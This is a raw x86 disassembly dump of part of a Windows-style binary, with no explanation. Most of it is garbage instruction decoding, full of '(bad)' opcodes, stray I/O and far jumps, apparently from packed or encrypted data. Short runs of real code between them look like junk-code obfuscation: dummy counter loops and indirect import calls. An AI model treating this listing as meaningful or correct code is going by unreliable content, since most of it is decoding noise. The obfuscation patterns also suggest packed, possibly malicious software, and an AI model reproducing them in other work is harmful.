  40e1c4:	pop    edi
  40e1c5:	push   ss
  40e1c6:	lahf   
  40e1c7:	loope  0x40e1d9
  40e1c9:	mov    ecx,0x7ad6836e
  40e1ce:	in     al,dx
  40e1cf:	sti    
  40e1d0:	dec    edi
  40e1d1:	add    DWORD PTR [ecx],ebp
  40e1d3:	push   ecx
  40e1d4:	sbb    BYTE PTR cs:[eax],dl
  40e1d7:	mov    eax,0x48169cea
  40e1dc:	jnp    0x40e181
  40e1de:	loop   0x40e183
  40e1e0:	dec    esi
  40e1e1:	adc    al,0x55
  40e1e3:	mov    eax,0x129091f6
  40e1e8:	ficomp DWORD PTR [ecx+0x4d8c8b3e]
  40e1ee:	or     al,0xaf
  40e1f0:	xor    DWORD PTR [esp+eiz*4+0x37],ebx
  40e1f4:	push   edi
  40e1f5:	mov    bh,0x2
  40e1f7:	adc    BYTE PTR [edi-0x20],ch
  40e1fa:	rcr    cl,1
  40e1fc:	(bad)  
  40e1fd:	dec    esp
  40e1fe:	inc    edx
  40e1ff:	mov    dl,0xae
  40e201:	mov    ds:0xe8746e4e,eax
  40e206:	(bad)  
  40e207:	mov    bl,0x9a
  40e209:	sar    esi,0x44
  40e20c:	mov    ebx,0xa9c886dc
  40e211:	mov    ch,BYTE PTR [edx]
  40e213:	ds lahf 
  40e215:	rol    DWORD PTR ds:0x48fcd56d,1
  40e21b:	cdq    
  40e21c:	mov    ebx,0x65608f50
  40e221:	mov    bh,0xa6
  40e223:	lahf   
  40e224:	adc    eax,0x2d7d85e3
  40e229:	xor    eax,0x568ad0ea
  40e22e:	or     ebx,DWORD PTR [eax+0x208dada3]
  40e234:	test   al,0x59
  40e236:	rcr    dl,0x75
  40e239:	in     eax,dx
  40e23a:	xor    DWORD PTR [esp+esi*8],esi
  40e23d:	or     ebp,DWORD PTR [edi-0x69]
  40e240:	(bad)  
  40e243:	rcl    BYTE PTR [eax],cl
  40e245:	fist   WORD PTR [eax*8-0x20121172]
  40e24c:	sbb    al,BYTE PTR [esi-0x6d]
  40e24f:	jmp    0x17e7:0xcd66141e
  40e256:	mov    DWORD PTR [edi+0x35],esi
  40e259:	test   al,0x2a
  40e25b:	adc    DWORD PTR [ecx-0x5af192f2],0x6dc7710a
  40e265:	sub    eax,0x7056ae88
  40e26a:	in     al,dx
  40e26b:	inc    eax
  40e26c:	sbb    eax,0xeaeff9ed
  40e271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e272:	pusha  
  40e273:	and    ebx,DWORD PTR fs:[ebp-0x44]
  40e277:	xchg   DWORD PTR [ecx-0x77],eax
  40e27a:	add    DWORD PTR [ebp+0x2581fc45],ecx
  40e280:	std    
  40e281:	cld    
  40e282:	inc    edx
  40e283:	add    BYTE PTR [eax],al
  40e285:	add    BYTE PTR [eax],al
  40e287:	add    BYTE PTR [ebx+0x42fcfd0d],cl
  40e28d:	add    BYTE PTR [ecx-0x77],al
  40e290:	or     eax,0x42fcfd
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	inc    ebp
  40e377:	jo     0x40e3f4
  40e379:	out    0x3b,al
  40e37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e37c:	jo     0x40e3ee
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e313
  40e383:	daa    
  40e384:	ret    
  40e385:	sbb    DWORD PTR [edx+0x3d],0x16fa3dcb
  40e38c:	out    dx,eax
  40e38d:	mov    edi,0x3190e7c9
  40e392:	dec    ecx
  40e393:	inc    edx
  40e394:	loop   0x40e327
  40e396:	jnp    0x40e3d0
  40e398:	cmp    eax,0x1e1e7b51
  40e39d:	(bad)  
  40e39e:	call   0x5e92ad01
  40e3a3:	mov    ch,0x46
  40e3a5:	mov    ebp,DWORD PTR [ecx]
  40e3a7:	jg     0x40e37b
  40e3a9:	cmc    
  40e3aa:	xchg   ebp,eax
  40e3ab:	std    
  40e3ac:	inc    edx
  40e3ad:	xchg   esi,eax
  40e3ae:	xor    edi,DWORD PTR [edx-0x7ef43c82]
  40e3b4:	ret    0x5bd4
  40e3b7:	add    eax,0x66396e57
  40e3bc:	bound  edi,QWORD PTR [ecx]
  40e3be:	xlat   BYTE PTR ds:[ebx]
  40e3bf:	ror    DWORD PTR [esi+0x7311fd3c],0xbd
  40e3c6:	scas   al,BYTE PTR es:[edi]
  40e3c7:	out    0x7f,al
  40e3c9:	push   esp
  40e3ca:	les    esp,FWORD PTR [edx+0x7e]
  40e3cd:	push   es
  40e3ce:	pop    es
  40e3cf:	jo     0x40e3ad
  40e3d1:	cld    
  40e3d2:	or     al,0x35
  40e3d4:	sbb    al,0xc7
  40e3d6:	out    0x96,eax
  40e3d8:	sub    eax,DWORD PTR [esp+eiz*4-0xc]
  40e3dc:	xchg   ebp,esi
  40e3de:	leave  
  40e3df:	retf   
  40e3e0:	jg     0x40e3c3
  40e3e2:	mov    esi,0x4883731a
  40e3e7:	xchg   esi,eax
  40e3e8:	(bad)  
  40e3e9:	clc    
  40e3ea:	xchg   edx,eax
  40e3eb:	pop    ebx
  40e3ec:	xor    eax,0x465c7f28
  40e3f1:	sub    eax,0x3b9424f7
  40e3f6:	mov    ebx,0x6daf07e7
  40e3fb:	pop    esi
  40e3fc:	xor    bh,BYTE PTR [ecx-0x59]
  40e3ff:	inc    ebx
  40e400:	xlat   BYTE PTR ds:[ebx]
  40e401:	int    0x4f
  40e403:	fmul   DWORD PTR [edx+0x7a]
  40e406:	pushf  
  40e407:	aas    
  40e408:	cmp    DWORD PTR [ebx-0x3],eax
  40e40b:	(bad)  
  40e40c:	jae    0x40e3f2
  40e40e:	ja     0x40e3ff
  40e410:	popa   
  40e411:	retf   0xbf9
  40e414:	icebp  
  40e415:	lahf   
  40e416:	sub    BYTE PTR [eax],ch
  40e418:	jmp    0x6d713424
  40e41d:	xchg   edi,eax
  40e41e:	aad    0x30
  40e420:	shl    DWORD PTR cs:[ecx+0x1a],1
  40e424:	jno    0x40e3c9
  40e426:	xor    al,BYTE PTR [ecx]
  40e428:	loopne 0x40e467
  40e42a:	shl    DWORD PTR ds:0xa2db5ce7,1
  40e430:	mov    ecx,0xa79004f4
  40e435:	pop    ebx
  40e436:	cmp    eax,0x77a3ad
  40e43b:	mov    bl,0x98
  40e43d:	enter  0xff82,0xeb
  40e441:	or     ah,BYTE PTR [eax]
  40e443:	ins    DWORD PTR es:[edi],dx
  40e444:	mov    WORD PTR [esi],es
  40e446:	cli    
  40e447:	mov    ss,WORD PTR [ecx]
  40e449:	(bad)  
  40e44a:	mov    DWORD PTR [edi-0x24],esp
  40e44d:	lds    ebx,FWORD PTR [ebx-0x730a5036]
  40e453:	mov    edx,ds
  40e455:	mov    edi,0x284e7595
  40e45a:	or     ah,BYTE PTR [eax+0x6021e2aa]
  40e460:	lods   al,BYTE PTR ds:[esi]
  40e461:	call   0xe177:0xd4dad5ae
  40e468:	(bad)  
  40e469:	in     eax,dx
  40e46a:	mov    ebx,?
  40e46c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e46d:	push   edx
  40e46e:	xchg   ebx,eax
  40e46f:	stc    
  40e470:	mov    edi,0x9651b1db
  40e475:	shl    DWORD PTR [edx-0x71],cl
  40e478:	sub    bl,BYTE PTR [eax]
  40e47a:	dec    edx
  40e47b:	dec    ebx
  40e47c:	dec    eax
  40e47d:	into   
  40e47e:	inc    ebp
  40e47f:	mov    DWORD PTR [ecx+0x6227f310],eax
  40e485:	std    
  40e486:	es jne 0x40e4de
  40e489:	ret    0xd176
  40e48c:	jo     0x40e427
  40e48e:	inc    ebx
  40e48f:	dec    ecx
  40e490:	cmp    al,0x33
  40e492:	inc    ebx
  40e493:	mov    ecx,DWORD PTR [edx+0x5d]
  40e496:	gs (bad) 
  40e498:	repnz scas al,BYTE PTR es:[edi]
  40e49a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e49b:	fld    DWORD PTR [edi]
  40e49d:	shr    BYTE PTR [esi-0x2e180b1],cl
  40e4a3:	pop    ds
  40e4a4:	test   DWORD PTR [edi-0x3f116a0e],edi
  40e4aa:	iret   
  40e4ab:	scas   eax,DWORD PTR es:[edi]
  40e4ac:	xchg   edx,eax
  40e4ad:	mov    edi,0x6731ff90
  40e4b2:	push   edx
  40e4b3:	push   0xaed64cf7
  40e4b8:	daa    
  40e4b9:	ret    
  40e4ba:	ret    
  40e4bb:	xchg   DWORD PTR [edi-0x1e],esp
  40e4be:	imul   esi,DWORD PTR [edx+edx*2],0x6dbd25d2
  40e4c5:	imul   edx,DWORD PTR [edi-0x4189fc49],0x4bc1652b
  40e4cf:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x3f6f740f
  40e4f5:	(bad)  
  40e4f6:	test   BYTE PTR [esi-0x3c8f8f5d],0x7f
  40e4fd:	jo     0x40e56f
  40e4ff:	fmul   QWORD PTR [ebp+0x11d71512]
  40e505:	aas    
  40e506:	mov    ch,0xff
  40e508:	dec    eax
  40e509:	arpl   WORD PTR [bx+0x4fa8],bp
  40e50e:	ror    DWORD PTR [ebx-0x3cedf26e],0x37
  40e515:	pop    ebp
  40e516:	dec    BYTE PTR [ecx+eax*8+0x78]
  40e51a:	add    DWORD PTR [esi],edx
  40e51c:	add    dh,ch
  40e51e:	or     cl,BYTE PTR [ebp*1+0x6f0478da]
  40e525:	mov    edx,0x3754377
  40e52a:	jbe    0x40e5a0
  40e52c:	outs   dx,BYTE PTR ds:[esi]
  40e52d:	pop    ss
  40e52e:	mov    ah,0xd3
  40e530:	jbe    0x40e58d
  40e532:	jp     0x40e579
  40e534:	inc    ebx
  40e535:	jo     0x40e536
  40e537:	mov    ebp,0xda055a71
  40e53c:	je     0x40e5ad
  40e53e:	push   es
  40e53f:	inc    esi
  40e540:	adc    ah,ah
  40e542:	or     bl,bh
  40e544:	sbb    ecx,DWORD PTR [esp+ecx*2-0x3b]
  40e548:	sbb    edx,DWORD PTR [edx+0x5f]
  40e54b:	ds scas al,BYTE PTR es:[edi]
  40e54d:	adc    DWORD PTR [ebp+0x46d8755],0x1
  40e554:	xchg   edx,eax
  40e555:	aam    0x5a
  40e557:	pop    eax
  40e558:	xor    eax,0x39bdf888
  40e55d:	sbb    DWORD PTR [ecx+0x60],ecx
  40e560:	fdivr  st(7),st
  40e562:	and    al,0x90
  40e564:	mov    BYTE PTR [ecx+0x7a],cl
  40e567:	cmp    ebp,DWORD PTR [ebp-0x7d]
  40e56a:	jno    0x40e5a4
  40e56c:	es cmp ebp,ebx
  40e56f:	fist   DWORD PTR [ecx]
  40e571:	xor    eax,DWORD PTR [eax]
  40e573:	and    BYTE PTR [ebx+0x52724803],ah
  40e579:	sbb    BYTE PTR [esi],bl
  40e57b:	and    eax,0x6a52458a
  40e580:	push   esi
  40e581:	mov    BYTE PTR [edx-0x72],dh
  40e584:	push   eax
  40e585:	pop    ebp
  40e586:	sub    BYTE PTR [ecx+0x1f],bl
  40e589:	pop    esp
  40e58a:	xchg   BYTE PTR [edx],bl
  40e58c:	mov    esi,0x9e5bf302
  40e591:	aas    
  40e592:	xor    esp,DWORD PTR [ebx]
  40e594:	es dec ecx
  40e596:	imul   esi,DWORD PTR [esi],0x74d39e31
  40e59c:	cmp    BYTE PTR [esi+eax*1],bh
  40e59f:	repz sbb edx,eax
  40e5a2:	inc    ebx
  40e5a3:	push   ss
  40e5a4:	jnp    0x40e58f
  40e5a6:	(bad)  
  40e5a7:	in     eax,dx
  40e5a8:	fbstp  TBYTE PTR [eax+0x1e]
  40e5ab:	aam    0xf6
  40e5ad:	inc    edx
  40e5ae:	adc    bl,dh
  40e5b0:	fisttp QWORD PTR [ebx+edi*4-0x5c]
  40e5b4:	inc    eax
  40e5b5:	or     edx,edi
  40e5b7:	and    al,0x6b
  40e5b9:	jbe    0x40e5ae
  40e5bb:	jbe    0x40e5e1
  40e5bd:	cwde   
  40e5be:	or     BYTE PTR [ecx-0x38aed799],al
  40e5c4:	pop    ebp
  40e5c5:	dec    edi
  40e5c6:	jns    0x40e607
  40e5c8:	and    ah,bh
  40e5ca:	xor    esp,DWORD PTR [eax]
  40e5cc:	xor    al,BYTE PTR [edx+0x7e]
  40e5cf:	mov    ebx,0xb9a2d427
  40e5d4:	jno    0x40e571
  40e5d6:	loop   0x40e5b7
  40e5d8:	xchg   ebx,eax
  40e5d9:	jl     0x40e588
  40e5db:	cdq    
  40e5dc:	fistp  WORD PTR [ebp-0x2cf39840]
  40e5e2:	fadd   QWORD PTR [ecx-0x44]
  40e5e5:	dec    eax
  40e5e6:	loopne 0x40e64c
  40e5e8:	imul   eax,DWORD PTR [esi+esi*2],0xe
  40e5ec:	test   DWORD PTR [ebx],esp
  40e5ee:	pop    eax
  40e5ef:	(bad)  
  40e5f0:	mov    bh,bl
  40e5f2:	pushf  
  40e5f3:	test   DWORD PTR [ebx+0x50],ebp
  40e5f6:	or     DWORD PTR [ecx],ebx
  40e5f8:	xor    ebx,esp
  40e5fa:	out    0x57,eax
  40e5fc:	xor    dh,BYTE PTR [esi+ebx*8]
  40e5ff:	mov    esi,0x1fecf3ae
  40e604:	pop    eax
  40e605:	imul   edx,DWORD PTR ds:0x4a0434cd,0xffffffbb
  40e60c:	xchg   edi,eax
  40e60d:	mov    cl,0xc7
  40e60f:	pop    ebx
  40e610:	mov    ebp,0xc10147d5
  40e615:	push   eax
  40e616:	xchg   esi,eax
  40e617:	fmul   DWORD PTR [edi]
  40e619:	adc    ebp,DWORD PTR [ebx+0x23435cbb]
  40e61f:	dec    edx
  40e620:	and    ecx,DWORD PTR [eax]
  40e622:	inc    ebp
  40e623:	inc    ebp
  40e624:	ds jno 0x40e652
  40e627:	mov    al,ds:0x84c37289
  40e62c:	and    ah,dh
  40e62e:	cdq    
  40e62f:	add    al,ah
  40e631:	and    eax,0xe9e34018
  40e636:	enter  0xcd1d,0x2
  40e63a:	cmp    BYTE PTR [edx],ch
  40e63c:	mov    bh,0xd2
  40e63e:	mul    DWORD PTR [edi+0x3f60d278]
  40e644:	call   0xefd2:0x78640bae
  40e64b:	lods   eax,DWORD PTR ds:[esi]
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	(bad)  
  40e6db:	push   ds
  40e6dc:	fdivr  st(7),st
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	and    BYTE PTR [esi+0x32],0x4c
  40e6ea:	push   cs
  40e6eb:	(bad)  
  40e6ed:	nop
  40e6ee:	(bad)  
  40e6ef:	push   0x324889a1
  40e6f4:	add    esp,ecx
  40e6f6:	and    ebx,esi
  40e6f8:	pop    ss
  40e6f9:	or     cl,BYTE PTR [ebx-0xdbd4967]
  40e6ff:	mov    ah,0xd8
  40e701:	inc    edx
  40e702:	ucomiss xmm2,DWORD PTR [ebx]
  40e705:	stos   DWORD PTR es:[edi],eax
  40e706:	js     0x40e771
  40e708:	loopne 0x40e6cb
  40e70a:	ficom  WORD PTR [esi+0x28da6f40]
  40e710:	popf   
  40e711:	fwait
  40e712:	test   DWORD PTR [edi-0x102414ae],0x632a3c6d
  40e71c:	mov    dl,0xf7
  40e71e:	int    0xa
  40e720:	in     eax,0x35
  40e722:	rcr    DWORD PTR [esi+esi*1+0x365ac175],1
  40e729:	mov    dl,0xd2
  40e72b:	xchg   ecx,eax
  40e72c:	je     0x40e773
  40e72e:	arpl   WORD PTR [eax+0x547f918c],di
  40e734:	test   DWORD PTR [eax-0x24],eax
  40e737:	dec    esi
  40e738:	mov    dh,0xa
  40e73a:	(bad)  [edi]
  40e73c:	repnz cmp BYTE PTR [edx-0x607cad4e],al
  40e743:	stos   DWORD PTR es:[edi],eax
  40e744:	xchg   edx,eax
  40e745:	enter  0x4a3f,0x74
  40e749:	(bad)  [edx+ecx*1]
  40e74c:	inc    edi
  40e74d:	fnsave [ecx+0x29a2921]
  40e753:	jmp    0x40e728
  40e755:	sbb    al,0xaf
  40e757:	jae    0x40e6eb
  40e759:	retf   
  40e75a:	or     DWORD PTR ds:0x707f531d,ecx
  40e760:	shl    BYTE PTR [eax-0x47],0x14
  40e764:	lea    esp,[ebx+0x4a]
  40e767:	shr    BYTE PTR [esi-0x58957345],cl
  40e76d:	(bad)  
  40e76e:	cmp    eax,0x368284cf
  40e773:	push   edx
  40e774:	not    BYTE PTR [esp+edi*1+0x43]
  40e778:	lods   eax,DWORD PTR ds:[esi]
  40e779:	stc    
  40e77a:	and    BYTE PTR [esi+0x5ed9b169],ch
  40e780:	xchg   edx,eax
  40e781:	hlt    
  40e782:	push   ds
  40e783:	hlt    
  40e784:	sar    ebp,cl
  40e786:	iret   
  40e787:	aad    0xf6
  40e789:	add    edi,0x3b660583
  40e78f:	mov    bl,0x18
  40e791:	ins    DWORD PTR es:[edi],dx
  40e792:	imul   edi,DWORD PTR [ebp-0x57],0xbfd1b468
  40e799:	sbb    BYTE PTR [edi-0x36],ah
  40e79c:	add    eax,0x8d978287
  40e7a1:	push   es
  40e7a2:	cmp    ebx,0xffffff83
  40e7a5:	xor    eax,0xca09806c
  40e7aa:	(bad)  
  40e7ab:	sbb    ch,al
  40e7ad:	sub    DWORD PTR [ecx+ecx*1+0x34],edi
  40e7b1:	loopne 0x40e7b1
  40e7b3:	jbe    0x40e7b9
  40e7b5:	xlat   BYTE PTR ss:[ebx]
  40e7b7:	int    0xa5
  40e7b9:	sub    edx,DWORD PTR [edx-0x7a3cc161]
  40e7bf:	(bad)  
  40e7c0:	sbb    al,BYTE PTR [esi+ebp*2+0x6b80ede2]
  40e7c7:	sbb    eax,0x5d5a3936
  40e7cc:	mov    ecx,0xddb20106
  40e7d1:	dec    edx
  40e7d2:	xchg   al,bl
  40e7d4:	mov    DWORD PTR [eax],esp
  40e7d6:	sbb    dh,BYTE PTR [edx+ecx*2-0x339ebf7a]
  40e7dd:	mov    eax,ds:0xd424d9a
  40e7e2:	pop    es
  40e7e3:	mov    esi,0xe55a9cd8
  40e7e8:	mov    ch,0x1e
  40e7ea:	in     eax,dx
  40e7eb:	lods   al,BYTE PTR ds:[esi]
  40e7ec:	sbb    eax,0x9e4c46c9
  40e7f1:	mov    ecx,0x1c026fb2
  40e7f6:	int    0x2b
  40e7f8:	dec    edx
  40e7f9:	add    eax,ebx
  40e7fb:	cmp    bh,BYTE PTR [esi]
  40e7fd:	push   es
  40e7fe:	cmc    
  40e7ff:	and    ah,0x75
  40e802:	inc    esi
  40e803:	inc    esi
  40e804:	xlat   BYTE PTR ds:[ebx]
  40e805:	cmp    edi,ebp
  40e807:	mov    ebx,0xeb5a1cb6
  40e80c:	enter  0xf58e,0xcd
  40e810:	pop    es
  40e811:	dec    esi
  40e812:	cwde   
  40e813:	mov    ebp,0xa9648cdc
  40e818:	mov    bl,0x12
  40e81a:	adc    eax,0x633a26d4
  40e81f:	inc    ebx
  40e820:	lock pop esp
  40e822:	jns    0x40e7f0
  40e824:	mov    ebx,0xfb094fd2
  40e829:	shl    BYTE PTR [edi],1
  40e82b:	lods   al,BYTE PTR ds:[esi]
  40e82c:	bound  esi,QWORD PTR [edx-0x6ef8af7e]
  40e832:	dec    edi
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	lock icebp 
  40e94b:	sub    cl,bh
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8e2
  40e956:	push   edx
  40e957:	xchg   esp,eax
  40e958:	push   0x1c31b407
  40e95d:	cmp    DWORD PTR [ecx-0x2f1cb2a9],eax
  40e963:	push   0x92a91c69
  40e968:	inc    esp
  40e969:	out    dx,eax
  40e96a:	dec    esp
  40e96b:	shl    DWORD PTR [ebx-0x3d],0xf5
  40e96f:	xor    eax,0xc67d202d
  40e974:	int    0x10
  40e976:	inc    edx
  40e977:	(bad)  
  40e978:	adc    ch,BYTE PTR [eax+0x4f]
  40e97b:	pusha  
  40e97c:	push   0x7357474b
  40e981:	js     0x40e924
  40e983:	pop    ecx
  40e984:	sbb    BYTE PTR [edx-0x19],al
  40e987:	xchg   esi,eax
  40e988:	xchg   esi,eax
  40e989:	dec    edx
  40e98a:	(bad)  
  40e98b:	pushf  
  40e98c:	retf   0xa6f5
  40e98f:	fistp  DWORD PTR [ebp+0x35c52b6e]
  40e995:	push   es
  40e996:	inc    ebp
  40e997:	xlat   BYTE PTR ds:[ebx]
  40e998:	xchg   edx,eax
  40e999:	sbb    al,0xcf
  40e99b:	sbb    eax,eax
  40e99d:	mov    edi,es
  40e99f:	dec    esi
  40e9a0:	and    bh,ah
  40e9a2:	push   cs
  40e9a3:	ds cdq 
  40e9a5:	jb     0x40e991
  40e9a7:	hlt    
  40e9a8:	pop    ecx
  40e9a9:	es jno 0x40e9cf
  40e9ac:	add    BYTE PTR [ebp+0x1],0xc2
  40e9b0:	lock add esp,DWORD PTR [esi+0x16]
  40e9b4:	repz inc edx
  40e9b6:	jl     0x40ea06
  40e9b8:	stos   BYTE PTR es:[edi],al
  40e9b9:	dec    edi
  40e9ba:	xchg   ebx,eax
  40e9bb:	test   eax,ebp
  40e9bd:	cmp    BYTE PTR [eax],ch
  40e9bf:	push   ss
  40e9c0:	push   cs
  40e9c1:	xchg   ebp,eax
  40e9c2:	mov    ebx,0xc48c1410
  40e9c7:	jmp    0x8ab7ffc8
  40e9cc:	sub    eax,0x3b20aa5d
  40e9d1:	xor    BYTE PTR [eax+eax*2],ah
  40e9d4:	sub    esp,DWORD PTR [edi-0xd4881d0]
  40e9da:	push   ds
  40e9db:	push   0xffffffc2
  40e9dd:	ret    
  40e9de:	fdivr  st(2),st
  40e9e0:	mov    edi,0x79bb542b
  40e9e5:	xor    DWORD PTR [esi-0x69],eax
  40e9e8:	adc    DWORD PTR ds:0x44c61991,edi
  40e9ee:	inc    ebx
  40e9ef:	and    eax,0xf0de79d5
  40e9f4:	fld    st(4)
  40e9f6:	pop    ecx
  40e9f7:	jno    0x40e9d3
  40e9f9:	in     eax,0xcd
  40e9fb:	pop    esi
  40e9fc:	jne    0x40e97f
  40e9fe:	adc    edi,eax
  40ea00:	gs xor eax,0xffffffd7
  40ea04:	xor    eax,0xf864ce36
  40ea09:	int    0x26
  40ea0b:	inc    ebx
  40ea0c:	mov    ah,0x6
  40ea0e:	jno    0x40e9c8
  40ea10:	push   ss
  40ea11:	sub    al,0x75
  40ea13:	shl    BYTE PTR [ebx-0x70],1
  40ea16:	and    ebp,DWORD PTR [eax]
  40ea18:	and    dl,0x8c
  40ea1b:	add    bh,BYTE PTR [ebx-0x53b4fa12]
  40ea21:	mov    esp,0xb69d6ee8
  40ea26:	pop    ss
  40ea27:	sub    BYTE PTR [esi-0x80],bh
  40ea2a:	mov    ch,0x39
  40ea2c:	lea    esi,[ecx+0x5c]
  40ea2f:	mov    dl,0x1b
